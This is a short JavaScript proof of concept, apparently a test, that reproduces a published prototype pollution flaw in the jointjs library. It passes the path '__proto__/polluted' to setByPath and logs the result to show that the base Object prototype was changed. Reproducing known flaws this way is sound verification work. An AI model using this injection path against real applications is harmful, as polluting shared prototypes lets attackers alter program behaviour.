// //https://snyk.io/vuln/SNYK-JS-JOINTJS-1024444
// test("prototype pollution in jointjs", () => {
console.log({}.polluted);

  const jointjs = require("jointjs");
  jointjs.util.setByPath({}, "__proto__/polluted", "yes", "/");

console.log({}.polluted);
// });
